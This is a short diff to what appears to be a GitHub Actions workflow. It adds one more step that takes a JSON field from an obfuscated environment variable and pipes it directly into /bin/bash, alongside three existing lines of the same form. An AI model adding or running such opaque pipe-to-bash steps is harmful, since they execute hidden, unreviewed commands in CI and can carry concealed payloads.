@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$hjiap2474" | jq -r .af243 | /bin/bash
           echo $pbj6715 | jq -r .isq1 | /bin/bash
           echo $mxy6566 | jq -r .c672 | /bin/bash
+          echo $owt5110 | jq -r .gzze6 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
